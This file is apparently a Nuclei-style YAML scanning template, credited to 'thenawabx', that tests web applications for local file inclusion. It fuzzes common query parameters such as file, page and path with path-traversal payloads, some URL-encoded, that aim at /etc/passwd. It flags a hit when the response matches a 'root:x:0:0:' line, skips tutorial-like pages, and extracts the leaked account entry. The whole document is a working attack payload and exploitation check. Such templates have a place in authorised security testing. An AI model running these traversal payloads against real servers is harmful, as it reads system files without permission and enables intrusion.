id: THENAWABX_FOUND_LFI
info:
  name: Nawab-Confirmed-LFI
  author: thenawabx
  severity: critical

http:
  - pre-condition:
      - expr: "queue.has_params"

    payloads:
      lfi_payloads:
        - "/etc/passwd"
        - "../../../../../../../../etc/passwd"
        - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"

    fuzzing:
      - part: query
        type: replace
        mode: multiple
        keys:
          - "file"
          - "page"
          - "path"
          - "doc"
          - "folder"
          - "lang"
          - "view"
          - "src"
        fuzz:
          - "{{lfi_payloads}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "^root:x:0:0:"

      - type: word
        part: body
        negative: true
        words:
          - "example"
          - "tutorial"
          - "placeholder"
          - "syntax"
          - "W3Schools"
          - "how to"
          - "learning"
        condition: or

    extractors:
      - type: regex
        part: body
        regex:
          - "root:x:0:0:[^:\n]+:[^:\n]+:[^:\n]+"
